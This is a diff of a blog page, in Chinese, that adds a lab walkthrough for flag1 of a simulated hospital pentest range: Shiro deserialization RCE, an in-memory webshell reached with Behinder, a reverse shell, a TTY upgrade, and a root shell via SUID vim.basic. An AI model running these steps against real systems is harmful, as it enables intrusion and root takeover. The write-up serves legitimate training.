@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
 <title>2025-Hospital</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-hospital/'>
 
 <link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-Hospital">
-<meta property='og:description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<meta property='og:description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-hospital/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-06-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-12T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-Hospital">
-<meta name="twitter:description" content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<meta name="twitter:description" content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -259,7 +259,39 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#shiro反序列化rce">shiro反序列化RCE</a></li>
+    <li><a href="#预期vimbasic提权升级交互式终端">预期：vim.basic提权：升级交互式终端</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
@@ -319,7 +351,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -347,7 +379,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4</p>
+</div><h1 id="flag1">flag1
+</h1><h2 id="shiro反序列化rce">shiro反序列化RCE
+</h2><p>先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4</p>
 <p>扫描得到</p>
 <p><img src="/p/2025-hospital/image-20250612221343251.png"
 	width="1871"
@@ -392,7 +426,80 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar shiro_attack-2.2.jar
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>打入内存马后冰蝎连接（冰蝎连接时脚本选择jsp，php不行，蚁剑连接也是一样shell文件后缀是jsp，但是我的蚁剑shell文件类型没有jsp所以连不上）</p>
+<img src="image-20250617210828756.png" alt="image-20250617210828756" style="zoom:50%;" />
+<p>利用冰蝎反弹shell</p>
+<img src="image-20250617213919451.png" alt="image-20250617213919451" style="zoom:50%;" />
+<p>然后查找具有root权限的SUID的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
 </div>
+</div><img src="image-20250617214113248.png" alt="image-20250617214113248" style="zoom:50%;" />
+<p>发现vim有suid权限</p>
+<p><a class="link" href="https://gtfobins.github.io/gtfobins/vim/"  target="_blank" rel="noopener"
+    >vim | GTFOBins</a></p>
+<p>非预期直接猜到flag位置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /root/flag/flag01.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250617214419741.png" alt="image-20250617214419741" style="zoom:50%;" />
+<h2 id="预期vimbasic提权升级交互式终端">预期：vim.basic提权：升级交互式终端
+</h2><p>升级交互式终端，以欺骗某些命令让它们以为在合适的终端运行,vim.basic有suid权限，但是必须有tty，也就是交互式shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整的命令本来是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;	
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">ctrl+z
+</span></span><span class="line"><span class="cl">stty raw -echo; fg
+</span></span><span class="line"><span class="cl">reset
+</span></span><span class="line"><span class="cl">xterm-256color
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://saucer-man.com/information_security/233.html"  target="_blank" rel="noopener"
+    >实现交互式shell的几种方式 - yanq的个人博客</a></p>
+<p>然后suid提权就有了root权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/bin/vim.basic  -c &#39;:python3 import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-pc&#34;, &#34;reset; exec sh -p&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250617230628561.png" alt="image-20250617230628561" style="zoom:50%;" />
+<p>这个思路是看这个<a class="link" href="https://aniale.top/article/yiyo9zcb/#web01"  target="_blank" rel="noopener"
+    >春秋云镜-Hospital | aniale&rsquo;s blog</a></p>
+<p>本来是看<a class="link" href="https://chimedal.github.io/2024/09/30/Hospital/index.html"  target="_blank" rel="noopener"
+    >春秋云境-Hospital</a>，<a class="link" href="https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh"  target="_blank" rel="noopener"
+    >春秋云镜仿真靶场Hospital实操 - lca</a>这两篇，交互终端后添加一个拥有root的hacker账户，但是不知道为啥云服务器上编辑这个/etc/passwd有点问题（编辑云服务器的/etc/passwd可以，题目的不行），所以就直接提权拿flag了</p>
+
 </section>
 
 
@@ -434,12 +541,12 @@
             
                 
 <article class="">
-    <a href="/p/smileyctf-2025/">
+    <a href="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">smileyctf-2025</h2>
+            <h2 class="article-title">2025-极客大挑战</h2>
         </div>
     </a>
 </article>
